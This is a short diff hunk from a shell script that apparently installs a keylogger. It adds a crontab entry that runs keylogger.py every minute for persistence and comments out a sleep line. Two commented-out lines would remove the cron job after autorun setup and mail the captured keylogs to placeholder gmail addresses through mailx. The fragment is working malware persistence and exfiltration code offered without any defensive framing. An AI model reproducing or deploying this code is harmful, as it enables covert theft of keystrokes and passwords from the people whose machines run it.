@@ -36,7 +36,7 @@ crontab_command="* * * * * cd ${path} && "$py_version" keylogger.py >> ../logs/k
 
 crontab -l 2>/dev/null| cat - <(echo "$crontab_command") | crontab -
 
-sleep 90 # sleep for 90 seconds, 30 seconds before the second call of the keylogger file
+# sleep 90 # sleep for 90 seconds, 30 seconds before the second call of the keylogger file
 
 # crontab -u $USER -l | grep -v "$crontab_command" | crontab -u $USER - # rm cronjob after the script is part of the autorun in the OS
 # echo hi.tmp | mailx -s "keylogs $(date)" -r sender_email@gmail.com receiver_email@gmail.com
